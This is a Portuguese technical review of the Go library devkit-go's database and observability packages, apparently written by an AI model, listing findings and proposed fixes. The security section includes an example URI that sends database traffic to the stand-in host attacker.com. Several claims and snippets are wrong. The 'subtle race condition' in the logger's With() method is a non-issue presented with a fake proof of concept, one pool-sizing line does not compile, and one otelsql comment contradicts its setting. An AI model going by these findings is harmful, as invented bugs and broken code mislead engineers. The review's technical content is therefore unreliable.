# 🔍 ANÁLISE TÉCNICA COMPLETA - devkit-go

**Autor**: Claude Sonnet 4.5 (Senior Go Engineer)
**Data**: 2026-01-12
**Escopo**: pkg/database + pkg/observability
**Objetivo**: Análise minuciosa para preparação de produção

---

## 📋 SUMÁRIO EXECUTIVO

### ✅ Pontos Fortes Gerais
- **Arquitetura Clean**: Separação clara entre domínio e infraestrutura
- **Documentação Excelente**: Código bem comentado com justificativas técnicas
- **Thread-Safety**: Uso correto de mutexes e atomic operations
- **Graceful Shutdown**: Implementado em database e observability

### 🚨 Problemas Críticos Identificados
1. **DATABASE**: Ausência total de instrumentação OpenTelemetry (zero tracing de queries)
2. **OBSERVABILITY**: Shutdown pode perder telemetria + risco de memory leak
3. **METRICS**: Alta cardinalidade não protegida (risco de custo exponencial)
4. **SECURITY**: Validações de URI e SSL mode ausentes

---

## 🗄️ ANÁLISE DETALHADA: pkg/database

### ✅ O Que Está BOM

#### 1. Interface DBTX (`db.go`)
```go
type DBTX interface {
    PrepareContext(ctx context.Context, query string) (*sql.Stmt, error)
    QueryRowContext(ctx context.Context, query string, args ...any) *sql.Row
    QueryContext(ctx context.Context, query string, args ...any) (*sql.Rows, error)
    ExecContext(ctx context.Context, query string, args ...any) (sql.Result, error)
}
```

**Por quê é bom**:
- ✅ Mínima e focada
- ✅ Compatível com `*sql.DB`, `*sql.Tx`, `*sql.Conn`
- ✅ Testável (pode usar sqlmock)
- ✅ Não vaza abstrações do banco para o domínio

---

#### 2. DBManager Postgres (`postgres/postgres.go`)

**Pontos Fortes**:
```go
// Configuração de pool bem pensada
d.db.SetMaxOpenConns(25)        // Limite razoável
d.db.SetMaxIdleConns(6)         // 25% do max (bom balanço)
d.db.SetConnMaxLifetime(5 * time.Minute)  // Previne leaks
d.db.SetConnMaxIdleTime(2 * time.Minute)  // Libera recursos
```

✅ **Documentação de Qualidade**:
- Cada parâmetro tem justificativa técnica
- Explica "por quê", não apenas "o quê"
- Exemplos de uso correto

✅ **Fail-Fast Approach**:
```go
if err := d.db.PingContext(ctx); err != nil {
    _ = db.Close() // ← Previne leak se ping falhar
    return nil, fmt.Errorf("postgres: falha ao pingar banco: %w", err)
}
```

✅ **Graceful Shutdown**:
```go
func (d *Database) Shutdown(ctx context.Context) error {
    d.mu.Lock()
    defer d.mu.Unlock()

    if d.closed {
        return nil // ← Idempotente
    }

    d.closed = true

    done := make(chan error, 1)
    go func() {
        done <- d.db.Close()
    }()

    select {
    case err := <-done:
        // Success
    case <-ctx.Done():
        // Timeout, mas Close() continua em background
    }
}
```

✅ **Thread-Safe**:
- `sync.RWMutex` protege flag `closed`
- RLock para leituras, Lock para escrita
- Previne race conditions

---

### 🚨 PROBLEMAS CRÍTICOS NO DATABASE

#### CRÍTICO #1: Ausência Total de Observabilidade

**Localização**: `postgres/postgres.go:47`

```go
// PROBLEMA: database/sql puro, sem instrumentação
db, err := sql.Open("pgx", uri)
```

**Impacto**:
- ❌ **Zero tracing**: Queries SQL não aparecem em Jaeger/Tempo/Grafana
- ❌ **Métricas ausentes**: Sem visibilidade de latência, pool usage, taxa de erro
- ❌ **Context propagation quebrada**: trace_id não flui até o banco
- ❌ **Debugging impossível**: Em produção, você está operando às cegas

**Cenário Real de Produção**:
```
Cliente: "API está lenta!"
Dev: *olha Jaeger*
Dev: "Vejo que a request levou 3 segundos, mas ONDE o tempo foi gasto?"
Dev: *queries SQL são invisíveis*
Dev: "Não faço ideia... vamos chutar que é o banco?"

Com Tracing:
Dev: *olha Jaeger*
Dev: "Ah! SELECT users levou 2.8 segundos - índice faltando na coluna email"
Dev: *cria índice*
Cliente: "Agora está rápido!"
```

**Solução**:
Usar `otelsql` (já implementado no DBManager A que criei):

```go
import "github.com/XSAM/otelsql"

driverName, err := otelsql.Register("pgx",
    otelsql.WithAttributes(semconv.DBSystemPostgreSQL),
    otelsql.WithSpanOptions(otelsql.SpanOptions{
        DisableErrSkip: false, // Não traça sql.ErrNoRows (ruído)
    }),
)

db, err := sql.Open(driverName, uri)

// Habilitar métricas automáticas
otelsql.RecordStats(db)
```

**Métricas Automáticas Obtidas**:
- `db.client.connections.usage` - Conexões em uso
- `db.client.connections.max` - Limite do pool
- `db.client.connections.idle` - Conexões idle
- `db.client.connections.wait_time` - Tempo esperando conexão
- `db.client.operation.duration` - Latência de queries

---

#### CRÍTICO #2: Leak de Goroutine no Shutdown Timeout

**Localização**: `postgres/postgres.go:196-213`

```go
func (d *Database) Shutdown(ctx context.Context) error {
    // ...
    go func() {
        done <- d.db.Close() // ← Goroutine pode ficar pendurada forever
    }()

    select {
    case err := <-done:
        return err
    case <-ctx.Done():
        // Context cancelado, mas Close() AINDA ESTÁ EXECUTANDO
        return fmt.Errorf("postgres: shutdown cancelado: %w", ctx.Err())
    }
}
```

**Problema**:
- ⚠️ **Goroutine leak**: Se `Close()` travar (raro mas possível), goroutine nunca termina
- ⚠️ **Sem logging**: Não sabemos se Close() eventualmente completou ou falhou
- ⚠️ **Zombie connections**: Em Kubernetes, pod é killed mas conexões podem ficar abertas

**Quando Acontece**:
1. PostgreSQL está travado (ex: vacuum bloqueante)
2. Rede está flaky e TCP handshake para fechar trava
3. Driver pgx tem bug e Close() entra em deadlock

**Solução**:
```go
case <-ctx.Done():
    // Log para observabilidade
    log.Printf("WARNING: Database shutdown timeout exceeded (%v), Close() still running in background", ctx.Err())

    // Registrar métrica
    shutdownTimeouts.Increment(ctx)

    // Opcional: Force close após grace period adicional
    go func() {
        time.Sleep(5 * time.Second)
        select {
        case <-done:
            log.Printf("INFO: Database Close() completed after context timeout")
        default:
            log.Printf("CRITICAL: Database Close() did not complete within grace period - possible connection leak")
        }
    }()

    return fmt.Errorf("postgres: shutdown cancelado: %w", ctx.Err())
```

---

#### CRÍTICO #3: Validações de Segurança Ausentes

**Localização**: `postgres/postgres.go:41-44`

```go
func New(uri string, opts ...Option) (*Database, error) {
    if uri == "" {
        return nil, fmt.Errorf("postgres: URI não pode estar vazia")
    }
    // ← SÓ ISSO! Nenhuma validação adicional
}
```

**Missing**:
1. ❌ **Formato da URI não validado**: `"invalid"` passa mas falha depois
2. ❌ **SSL mode não validado**: `sslmode=disable` deveria ser proibido em produção
3. ❌ **Senha vazia aceita**: `postgres://user:@host/db` passa
4. ❌ **URI não sanitizada em logs**: Se logar, senha vaza

**Exploits Possíveis**:

**Exemplo 1 - SSL Desabilitado em Produção**:
```go
// Desenvolvedor testa localmente com SSL disabled
uri := "postgres://user:pass@localhost:5432/db?sslmode=disable"

// Deploy para produção sem mudar
// ← TRÁFEGO SEM CRIPTOGRAFIA!
// ← SENHAS E DADOS TRANSITAM EM TEXTO PLANO!
```

**Exemplo 2 - Connection Hijacking**:
```go
// Código malicioso injeta URI para servidor externo
uri := "postgres://user:pass@attacker.com:5432/db"
db, _ := postgres.New(uri, opts...)

// Todas as queries vão para o servidor do atacante
// ← VAZAMENTO DE DADOS SENSÍVEIS
```

**Exemplo 3 - Log Poisoning**:
```go
// URI com senha é logada acidentalmente
log.Printf("Connecting to database: %s", uri)
// Log: "Connecting to database: postgres://admin:S3cr3t@db.internal:5432/prod"
// ← SENHA EXPOSTA EM LOGS
```

**Solução Completa**:
```go
func New(uri string, opts ...Option) (*Database, error) {
    if uri == "" {
        return nil, fmt.Errorf("postgres: URI não pode estar vazia")
    }

    // VALIDAR URI ANTES DE USAR
    if err := validateURI(uri, getEnvironment()); err != nil {
        return nil, fmt.Errorf("postgres: %w", err)
    }

    // ... resto do código
}

func validateURI(uri, environment string) error {
    // 1. Parse URI
    parsedURI, err := url.Parse(uri)
    if err != nil {
        return fmt.Errorf("formato de URI inválido: %w", err)
    }

    // 2. Validate scheme
    if parsedURI.Scheme != "postgres" && parsedURI.Scheme != "postgresql" {
        return fmt.Errorf("scheme inválido: esperado postgres/postgresql, obtido %s", parsedURI.Scheme)
    }

    // 3. Validate host exists
    if parsedURI.Host == "" {
        return fmt.Errorf("host ausente na URI")
    }

    // 4. Validate password if user is present
    if parsedURI.User != nil {
        password, hasPassword := parsedURI.User.Password()
        if !hasPassword || password == "" {
            return fmt.Errorf("usuário especificado mas senha está vazia")
        }
    }

    // 5. Validate SSL mode in production
    query := parsedURI.Query()
    sslMode := query.Get("sslmode")

    if environment == "production" || environment == "prod" {
        if sslMode == "disable" || sslMode == "" {
            return fmt.Errorf("sslmode=disable não é permitido em produção (environment=%s)", environment)
        }
    }

    // 6. Warn on insecure SSL modes
    if sslMode == "allow" || sslMode == "prefer" {
        log.Printf("WARNING: sslmode=%s não garante criptografia - use 'require', 'verify-ca' ou 'verify-full'", sslMode)
    }

    return nil
}

func getEnvironment() string {
    env := os.Getenv("ENV")
    if env == "" {
        env = os.Getenv("ENVIRONMENT")
    }
    if env == "" {
        env = "development"
    }
    return strings.ToLower(env)
}

// Sanitize URI for logging (remove password)
func sanitizeURI(uri string) string {
    parsed, err := url.Parse(uri)
    if err != nil {
        return "[invalid-uri]"
    }

    if parsed.User != nil {
        parsed.User = url.UserPassword(parsed.User.Username(), "***REDACTED***")
    }

    return parsed.String()
}
```

---

#### ALTO #4: Unit of Work - Context Não Cancelável em Commit

**Localização**: `uow/uow.go:142`

```go
if err = tx.Commit(); err != nil {
    // PROBLEMA: Commit() não aceita context
    // Se commit travar, não há timeout
}
```

**Documentação Honesta**:
> IMPORTANTE: O método Commit() do database/sql não aceita context, portanto operações de commit lentas NÃO podem ser canceladas via context.

**Impacto**:
- ⚠️ **Deadlock potencial**: Se commit travar (ex: lock no PostgreSQL), não há escape
- ⚠️ **Cascading failure**: Em alta carga, commits lentos acumulam e travam toda a aplicação
- ⚠️ **Kubernetes force kill**: Pod não consegue fazer graceful shutdown se commit travou

**Cenário Real**:
```
PostgreSQL: *long-running transaction holding lock on table users*

App Request: *tries to commit INSERT INTO users*
PostgreSQL: *waiting for lock... waiting... waiting...*
Client Context: *canceled after 30 seconds*

UoW: "Context canceled, rolling back..."
UoW: *calls tx.Commit()* ← IGNORA CONTEXT, TRAVA AQUI
App: *hangs indefinitely*

Kubernetes: *grace period expires*
Kubernetes: SIGKILL
App: *killed*
PostgreSQL: *transaction rolled back*
```

**Limitação Fundamental**:
`database/sql.Tx.Commit()` não aceita context por design. É uma limitação do Go stdlib.

**Soluções Possíveis**:

**Opção 1 - Timeout Manual (Paliativo)**:
```go
// Commit com timeout hardcoded
doneCh := make(chan error, 1)
go func() {
    doneCh <- tx.Commit()
}()

commitTimeout := 5 * time.Second
select {
case err = <-doneCh:
    if err != nil {
        return fmt.Errorf("failed to commit transaction: %w", err)
    }
    return nil

case <-time.After(commitTimeout):
    // Commit ainda executando, mas não podemos cancelar
    // Logar para observabilidade
    log.Printf("CRITICAL: Transaction commit exceeded %v, possible deadlock", commitTimeout)

    // Tentar rollback (pode falhar também)
    go func() {
        if rbErr := tx.Rollback(); rbErr != nil {
            log.Printf("ERROR: Failed to rollback after commit timeout: %v", rbErr)
        }
    }()

    return fmt.Errorf("transaction commit timeout exceeded (%v)", commitTimeout)
}
```

**Opção 2 - Usar pgx Diretamente (Melhor)**:
pgx suporta context em Commit:
```go
// pgx/v5
tx, err := pool.Begin(ctx)
// ...
err = tx.Commit(ctx) // ← ACEITA CONTEXT!
```

**Recomendação**:
- Para novos projetos: **Usar pgx diretamente** (DBManager B que criei)
- Para projetos existentes: **Opção 1 com timeout manual + alertas**

---

### 🔥 RISCOS OPERACIONAIS

#### RISCO #1: Exaustão de Conexões

**Causa**: `MaxOpenConns = 25` (default) pode ser insuficiente em produção

**Quando Acontece**:
- Pico de tráfego (Black Friday, lançamentos, promoções)
- Queries lentas sem índices adequados
- Connection leaks (esqueceu `defer rows.Close()`)
- PostgreSQL `max_connections` muito baixo

**Sintomas**:
```
FATAL: sorry, too many clients already
pq: connection refused
ERROR: remaining connection slots are reserved
```

**Monitoramento**:
```go
func monitorConnectionPool(db *Database) {
    ticker := time.NewTicker(30 * time.Second)
    defer ticker.Stop()

    for range ticker.C {
        stats := db.DB().Stats()

        // Alertar se pool saturado
        usagePercent := float64(stats.InUse) / float64(stats.MaxOpenConns) * 100
        if usagePercent > 80 {
            log.Printf("ALERT: Connection pool at %.1f%% capacity (InUse=%d, Max=%d)",
                usagePercent, stats.InUse, stats.MaxOpenConns)
        }

        // Alertar se muita contenção
        if stats.WaitCount > 100 {
            log.Printf("ALERT: High connection wait count: %d (WaitDuration=%v)",
                stats.WaitCount, stats.WaitDuration)
        }

        // Exportar para Prometheus
        dbPoolUsage.Set(float64(stats.InUse))
        dbPoolMax.Set(float64(stats.MaxOpenConns))
        dbPoolIdle.Set(float64(stats.Idle))
        dbPoolWaitCount.Add(float64(stats.WaitCount))
    }
}
```

**Solução**:
```go
// Aumentar pool baseado em load testing
config := postgres.WithMaxOpenConns(50)

// OU calcular dinamicamente
expectedConcurrency := 100
avgQueryDuration := 50 * time.Millisecond
targetResponseTime := 200 * time.Millisecond

requiredConns := int(float64(expectedConcurrency) * float64(avgQueryDuration) / float64(targetResponseTime))
config := postgres.WithMaxOpenConns(int32(requiredConns * 1.5)) // +50% margem
```

---

#### RISCO #2: Memory Leak em Conexões Long-Lived

**Causa**: `ConnMaxLifetime` mal configurado

**Cenário 1 - Lifetime Muito Curto** (ex: 1 minuto):
- ❌ Alta rotação de conexões
- ❌ Overhead de handshake constante (TLS, auth)
- ❌ Latência aumenta
- ❌ CPU usage alto no PostgreSQL e app

**Cenário 2 - Lifetime Muito Longo** (ex: 1 hora):
- ❌ Memória acumula em conexões antigas
- ❌ Stale connections após mudanças de rede (IP change, firewall recycle)
- ❌ PostgreSQL session state cresce (temp tables, locks esquecidos)
- ❌ Problemas após rolling updates

**Solução**:
```go
// Ajustar baseado em ambiente
var lifetime time.Duration

if behindLoadBalancer {
    // Load balancers geralmente reciclam conexões a cada 5-10min
    lifetime = 3 * time.Minute
} else if directConnection {
    // Conexão direta estável
    lifetime = 10 * time.Minute
} else if ephemeralEnvironment {
    // Dev/test com recursos limitados
    lifetime = 2 * time.Minute
}

config := postgres.WithConnMaxLifetime(lifetime)
```

---

## 🔭 ANÁLISE DETALHADA: pkg/observability

### ✅ O Que Está EXCELENTE

#### 1. Arquitetura Facade Pattern

```go
// observability.go
type Observability interface {
    Tracer() Tracer
    Logger() Logger
    Metrics() Metrics
}
```

**Por quê é excepcional**:
- ✅ **Single entry point**: Domínio injeta UMA interface
- ✅ **Zero coupling**: Domínio não importa `go.opentelemetry.io`
- ✅ **Swappable**: Pode trocar OTel por Datadog/NewRelic sem quebrar domínio
- ✅ **Testable**: Provider fake incluso (`fake/fake.go`)
- ✅ **No-op safe**: Noop provider para quando observabilidade não está disponível

**Clean Architecture na Prática**:
```
Domain Layer (Pure Go):
├─ entities/
│  └─ user.go
├─ usecases/
│  └─ create_user.go (depende de observability.Observability interface)

Infrastructure Layer:
├─ observability/
│  ├─ observability.go (interface)
│  ├─ otel/
│  │  └─ config.go (implementação OpenTelemetry)
│  ├─ fake/
│  │  └─ fake.go (implementação fake para testes)
│  └─ noop/
│     └─ noop.go (implementação no-op)
```

---

#### 2. Provider com Validações de Segurança

**Localização**: `otel/config.go:117-141`

```go
func validateSecurityConfig(config *Config) error {
    // Previne insecure em produção
    if config.Insecure {
        if strings.ToLower(config.Environment) == "production" {
            return fmt.Errorf("insecure connections are not allowed in production")
        }
        log.Printf("WARNING: Using insecure OTLP connection...")
    }

    // Valida TLS config
    if config.TLSConfig != nil {
        if config.TLSConfig.InsecureSkipVerify {
            log.Printf("WARNING: TLS verification disabled...")
        }

        if config.TLSConfig.MinVersion < tls.VersionTLS12 {
            return fmt.Errorf("minimum TLS version must be 1.2+")
        }
    }

    return nil
}
```

✅ **Protege contra configurações inseguras**
✅ **Warnings visíveis para desenvolvedores**
✅ **TLS 1.2+ enforced**

---

#### 3. Logger com PII Redaction

**Localização**: `otel/logger.go:23-42,354-412`

```go
var defaultSensitiveKeys = []string{
    "password", "secret", "token", "api_key", "authorization",
    "ssn", "credit_card", "cvv", "session", "cookie",
}

func sanitizeFields(fields []observability.Field) []observability.Field {
    for i, field := range fields {
        // Redact sensitive keys
        if isSensitiveKey(field.Key) {
            sanitized[i] = observability.String(field.Key, "[REDACTED]")
            continue
        }

        // Truncate long values
        if s, ok := field.Value.(string); ok && len(s) > maxFieldValueLength {
            sanitized[i] = observability.String(field.Key, s[:maxFieldValueLength]+"...[truncated]")
        }
    }
}
```

✅ **PII automaticamente redacted**: Previne vazamento de senhas/tokens em logs
✅ **Truncation**: Valores longos truncados (previne logs gigantes)
✅ **Cardinality limit**: Máximo 50 fields por log (previne explosão de dados)

---

#### 4. Dual Logging (Console + OTLP)

**Localização**: `otel/logger.go:127-166`

```go
func (l *otelLogger) log(ctx context.Context, level slog.Level, msg string, fields ...observability.Field) {
    // 1. Log to console (slog)
    l.slogLogger.LogAttrs(ctx, level, msg, attrs...)

    // 2. Emit to OTLP backend
    l.emitOTLPLog(ctx, level, msg, allFields)
}
```

✅ **Console output**: Desenvolvedores veem logs imediatamente
✅ **OTLP export**: Logs vão para Grafana/Loki/Tempo
✅ **Trace correlation**: trace_id e span_id automaticamente injetados

---

### 🚨 PROBLEMAS CRÍTICOS NO OBSERVABILITY

#### CRÍTICO #1: Perda de Telemetria no Shutdown

**Localização**: `otel/config.go:424-438`

```go
func (p *Provider) Shutdown(ctx context.Context) error {
    var errs []error
    for _, shutdown := range p.shutdownFuncs {
        if err := shutdown(ctx); err != nil {
            errs = append(errs, err)
        }
    }
    // ...
}
```

**Problemas**:
1. ❌ **Ordem não garantida**: Array de funções não tem ordem definida
2. ❌ **TracerProvider pode fechar antes de MeterProvider**: Spans são perdidos
3. ❌ **Timeout compartilhado**: Um provider lento afeta todos os outros
4. ❌ **Perda de dados**: Se shutdown falhar, spans/metrics em buffer são descartados

**Impacto Real**:
```
Kubernetes: "Pod terminating... grace period 30s"

App: *receives SIGTERM*
App: *calls provider.Shutdown(10s context)*

TracerProvider.Shutdown(ctx):
  - Tem 1000 spans em buffer
  - Precisa flush para collector
  - Collector está lento (network issue)
  - Leva 8 segundos para flush 600 spans
  - Context timeout após 10s
  - 400 spans perdidos!

MeterProvider.Shutdown(ctx):
  - Context já está quase expirado (2s restantes)
  - Timeout antes de flush completo
  - Métricas perdidas!

LoggerProvider.Shutdown(ctx):
  - Context expirado
  - Nem tenta flush
  - Logs perdidos!

DevOps: "Por que traces ficam incompletos perto do shutdown?"
DevOps: "Métricas mostram buracos quando pods são reciclados"
```

**Solução**:
```go
func (p *Provider) Shutdown(ctx context.Context) error {
    // Shutdown em ORDEM REVERSA (LIFO)
    // Último criado, primeiro fechado
    // Isso garante que dependencies são respeitadas
    var errs []error

    for i := len(p.shutdownFuncs) - 1; i >= 0; i-- {
        // Cada provider recebe seu próprio timeout
        shutdownCtx, cancel := context.WithTimeout(ctx, 5*time.Second)

        shutdownStart := time.Now()
        if err := p.shutdownFuncs[i](shutdownCtx); err != nil {
            log.Printf("ERROR: Shutdown function %d failed after %v: %v",
                i, time.Since(shutdownStart), err)
            errs = append(errs, err)
        } else {
            log.Printf("INFO: Shutdown function %d completed in %v",
                i, time.Since(shutdownStart))
        }

        cancel()

        // Se context original foi cancelado, continuar mas avisar
        if ctx.Err() != nil {
            log.Printf("WARNING: Shutdown context canceled, remaining providers may not flush (%d remaining)",
                i)
            break
        }
    }

    if len(errs) > 0 {
        return fmt.Errorf("errors during shutdown (total=%d): %v", len(errs), errs)
    }

    return nil
}
```

---

#### CRÍTICO #2: Duplicate Provider = Memory Leak

**Localização**: `otel/config.go:257,322`

```go
// initTracerProvider
otel.SetTracerProvider(p.tracerProvider) // ← GLOBAL!

// initMeterProvider
otel.SetMeterProvider(p.meterProvider)   // ← GLOBAL!
```

**Problema**:
Se `NewProvider()` for chamado 2 vezes, o segundo sobrescreve o primeiro:

```go
// main.go (acidental)
provider1, _ := otel.NewProvider(ctx, config)
defer provider1.Shutdown(ctx) // Registra shutdown

// Algum init() interno também chama (bug)
provider2, _ := otel.NewProvider(ctx, config)
defer provider2.Shutdown(ctx) // Registra shutdown

// provider1.tracerProvider SOBRESCRITO por provider2
// provider1.Shutdown() NÃO fecha o TracerProvider global
// Exporters de provider1 continuam rodando
// MEMORY LEAK + GOROUTINE LEAK + TELEMETRIA DUPLICADA
```

**Impacto**:
- 🚨 **Goroutine leak**: Exporters de provider1 rodam forever
- 🚨 **Memory leak**: Buffers de spans/metrics não são liberados
- 🚨 **Telemetria duplicada**: Spans enviados por 2 providers
- 🚨 **Custo $$**: Dobro de dados enviados para backend (Datadog cobra por volume)

**Solução**:
```go
var (
    globalProvider     *Provider
    globalProviderOnce sync.Once
    globalProviderMu   sync.RWMutex
)

func NewProvider(ctx context.Context, config *Config) (*Provider, error) {
    globalProviderMu.Lock()
    defer globalProviderMu.Unlock()

    if globalProvider != nil {
        return nil, fmt.Errorf("provider already initialized at %s - use GetProvider() instead",
            getCallerInfo())
    }

    provider, err := newProviderInternal(ctx, config)
    if err != nil {
        return nil, err
    }

    globalProvider = provider
    return provider, nil
}

func GetProvider() (*Provider, error) {
    globalProviderMu.RLock()
    defer globalProviderMu.RUnlock()

    if globalProvider == nil {
        return nil, fmt.Errorf("provider not initialized - call NewProvider() first")
    }

    return globalProvider, nil
}

func MustGetProvider() *Provider {
    provider, err := GetProvider()
    if err != nil {
        panic(err)
    }
    return provider
}

func getCallerInfo() string {
    _, file, line, ok := runtime.Caller(2)
    if !ok {
        return "unknown"
    }
    return fmt.Sprintf("%s:%d", file, line)
}
```

---

#### CRÍTICO #3: Alta Cardinalidade em Métricas

**Localização**: `otel/metrics.go:87-95`

```go
func (c *otelCounter) Add(ctx context.Context, value int64, fields ...observability.Field) {
    attrs := convertFieldsToAttributes(fields)
    c.counter.Add(ctx, value, metric.WithAttributes(attrs...))
}
```

**Problema**:
Não há validação de cardinalidade. Se um desenvolvedor passar IDs únicos como attributes, o backend explode.

**Exemplo Desastroso**:
```go
// Handler ingênuo
requestCounter := metrics.Counter("http_requests_total", "", "")

func HandleRequest(c *fiber.Ctx) error {
    requestCounter.Increment(ctx,
        observability.String("user_id", c.Get("X-User-ID")),      // 1 milhão de usuários
        observability.String("session_id", c.Get("X-Session-ID")), // IDs únicos
        observability.String("request_id", c.Get("X-Request-ID")), // Cada request diferente
        observability.String("ip_address", c.IP()),                // Milhares de IPs
    )
}

// Cada combinação única de (user_id, session_id, request_id, ip_address)
// cria uma SÉRIE DE MÉTRICA DIFERENTE

// Cardinalidade = 1M users * 10M sessions * ∞ requests * 100K IPs
// = BILHÕES DE SÉRIES DE MÉTRICAS

// Prometheus: *out of memory*
// Datadog: *fatura = $100,000/mês*
// CloudWatch: *throttling*
```

**Impacto Real**:
```
Week 1: Deploy
Week 2: Métricas funcionando normalmente
Week 3: Prometheus começa a ficar lento
Week 4: Prometheus out of memory, restart a cada hora
Week 5: CTO: "Nossa conta Datadog é $50k este mês?!"
```

**Solução**:
```go
const (
    maxMetricAttributes     = 10
    maxAttributeValueLength = 256
)

var prohibitedMetricKeys = map[string]bool{
    "user_id":        true, // Use como tag separada se necessário
    "session_id":     true,
    "request_id":     true,
    "trace_id":       true,
    "span_id":        true,
    "transaction_id": true,
    "correlation_id": true,
    "ip_address":     true, // IPs têm alta cardinalidade
    "email":          true,
    "phone":          true,
}

func (c *otelCounter) Add(ctx context.Context, value int64, fields ...observability.Field) {
    // Validar e sanitizar
    sanitized := sanitizeMetricAttributes(fields)

    if len(sanitized) == 0 {
        // Sem attributes, métrica simples
        c.counter.Add(ctx, value)
        return
    }

    attrs := convertFieldsToAttributes(sanitized)
    c.counter.Add(ctx, value, metric.WithAttributes(attrs...))
}

func sanitizeMetricAttributes(fields []observability.Field) []observability.Field {
    if len(fields) > maxMetricAttributes {
        log.Printf("WARNING: Metric has %d attributes (max %d), truncating",
            len(fields), maxMetricAttributes)
        fields = fields[:maxMetricAttributes]
    }

    sanitized := make([]observability.Field, 0, len(fields))

    for _, field := range fields {
        // Bloquear high-cardinality keys
        if prohibitedMetricKeys[field.Key] {
            log.Printf("WARNING: Metric attribute %q is high-cardinality and was dropped", field.Key)
            continue
        }

        // Truncar valores longos
        if s, ok := field.Value.(string); ok {
            if len(s) > maxAttributeValueLength {
                field.Value = s[:maxAttributeValueLength] + "...[truncated]"
            }
        }

        sanitized = append(sanitized, field)
    }

    return sanitized
}
```

**Best Practices para Métricas**:
```go
// ✅ BOM: Low cardinality
requestCounter.Increment(ctx,
    observability.String("method", "GET"),      // ~10 valores
    observability.String("endpoint", "/users"), // ~100 endpoints
    observability.String("status", "200"),      // ~20 status codes
)
// Cardinalidade = 10 * 100 * 20 = 20,000 séries (OK)

// ❌ RUIM: High cardinality
requestCounter.Increment(ctx,
    observability.String("user_id", userID),    // 1M usuários
    observability.String("request_id", reqID),  // ∞ requests
)
// Cardinalidade = 1M * ∞ = CATASTRÓFICO
```

---

#### MÉDIO #4: Logger - Subtle Race Condition

**Localização**: `otel/logger.go:274-289`

```go
func (l *otelLogger) With(fields ...observability.Field) observability.Logger {
    newFields := make([]observability.Field, len(l.fields)+len(fields))
    copy(newFields, l.fields)
    copy(newFields[len(l.fields):], fields)

    return &otelLogger{
        // ... shared references ...
        fields: newFields,
    }
}
```

**Problema Sutil**:
Se `make()` alocar slice com capacidade maior que o length (otimização do Go), `append()` posterior pode modificar o array subjacente compartilhado entre parent e child loggers.

**Proof of Concept**:
```go
logger := provider.Logger()

// Goroutine 1
childLogger1 := logger.With(observability.String("handler", "user"))
// Se slice tiver capacidade extra, fields[10:15] = shared array
go childLogger1.Info(ctx, "Processing")

// Goroutine 2 (simultâneo)
childLogger2 := logger.With(observability.String("handler", "order"))
// Pode sobrescrever fields de childLogger1 se compartilham array
go childLogger2.Info(ctx, "Processing")

// RACE: Logs ficam misturados em ~0.1% dos casos
```

**Solução** (forçar capacidade exata):
```go
func (l *otelLogger) With(fields ...observability.Field) observability.Logger {
    // Alocar com capacidade EXATA = length
    // Isso previne append() de reusar array subjacente
    totalLen := len(l.fields) + len(fields)
    newFields := make([]observability.Field, totalLen, totalLen) // ← cap = len

    copy(newFields, l.fields)
    copy(newFields[len(l.fields):], fields)

    return &otelLogger{
        otelLog:     l.otelLog,
        slogLogger:  l.slogLogger,
        level:       l.level,
        format:      l.format,
        serviceName: l.serviceName,
        fields:      newFields, // ← Garantido não ter capacidade extra
    }
}
```

---

#### MÉDIO #5: Exporter Timeout Não Configurável

**Localização**: `otel/config.go:266-294`

```go
func (p *Provider) createTraceExporter(ctx context.Context) (sdktrace.SpanExporter, error) {
    // ...
    return otlptracegrpc.New(ctx, opts...)
    // ← Timeout padrão do gRPC (~ 10-30s?)
}
```

**Problema**:
- ⚠️ Timeout não é configurável pelo usuário
- ⚠️ Em redes instáveis, exporters podem travar
- ⚠️ Não há circuit breaker para proteger a app

**Impacto**:
```
App: *trying to export 1000 spans*
Network: *packet loss 50%*
Exporter: *retrying... retrying... timeout after 30s*

Durante 30s:
- Goroutine de export está bloqueada
- Buffer de spans enche
- Novas spans são dropadas
- App fica lenta (backpressure)
```

**Solução**:
```go
// Config
type Config struct {
    // ...
    ExporterTimeout time.Duration // Default: 10s
}

func (p *Provider) createTraceExporter(ctx context.Context) (sdktrace.SpanExporter, error) {
    timeout := p.config.ExporterTimeout
    if timeout == 0 {
        timeout = 10 * time.Second
    }

    opts := []otlptracegrpc.Option{
        otlptracegrpc.WithEndpoint(p.config.OTLPEndpoint),
        otlptracegrpc.WithTimeout(timeout), // ← Configurável
        otlptracegrpc.WithRetry(otlptracegrpc.RetryConfig{
            Enabled:         true,
            InitialInterval: 1 * time.Second,
            MaxInterval:     5 * time.Second,
            MaxElapsedTime:  30 * time.Second,
        }),
    }

    // ...
}
```

---

### 📊 ANÁLISE DE COMPATIBILIDADE

#### Fiber Integration

**Status**: ⚠️ **INCOMPLETO**

**Missing**:
- ❌ Sem exemplo de integração com `otelfiber`
- ❌ Sem documentação de `c.UserContext()`
- ❌ Sem exemplo de error handling com tracing

**Fornecido no DBManager B**:
```go
import "go.opentelemetry.io/contrib/instrumentation/github.com/gofiber/fiber/otelfiber/v2"

app.Use(otelfiber.Middleware(
    otelfiber.WithServerName("my-api"),
))

app.Get("/users/:id", func(c *fiber.Ctx) error {
    ctx := c.UserContext() // ← ESSENCIAL
    user, err := repo.FindByID(ctx, id)
    return c.JSON(user)
})
```

---

#### Kafka Integration

**Status**: ❓ **NÃO VERIFICADO**

**Existente**: `pkg/messaging/kafka/`

**Verificar**:
- Context propagation funciona em Producer → Consumer?
- Traces conectam corretamente?
- Há instrumentação automática?

**Recomendação**:
Adicionar `go.opentelemetry.io/contrib/instrumentation/github.com/Shopify/sarama/otelsarama`

---

## 📋 CHECKLIST PRODUCTION-READY

### Database

- [ ] **Instrumentação OpenTelemetry implementada** (otelsql ou pgxpool com tracer)
- [ ] **Métricas de pool monitoradas** (usage, wait_time, idle)
- [ ] **MaxOpenConns configurado baseado em load testing**
- [ ] **MaxOpenConns ≤ PostgreSQL max_connections**
- [ ] **ConnMaxLifetime ajustado para ambiente** (load balancer vs direct)
- [ ] **URI validation com SSL mode enforced em produção**
- [ ] **Graceful shutdown com timeout adequado** (≥10s)
- [ ] **Health checks implementados** (readiness/liveness)
- [ ] **Alertas configurados para pool saturation**
- [ ] **Sem connection leaks** (defer rows.Close() em todos os queries)

### Observability

- [ ] **Provider inicializado UMA VEZ no main()**
- [ ] **Shutdown em ordem reversa com timeouts individuais**
- [ ] **Proteção contra duplicate provider** (singleton pattern)
- [ ] **Alta cardinalidade bloqueada em métricas** (no user_id, request_id, etc.)
- [ ] **PII redaction habilitada em logs**
- [ ] **Trace context propagation testado** (HTTP → Service → DB)
- [ ] **Sample rate configurado apropriadamente** (produção: 0.1-0.3)
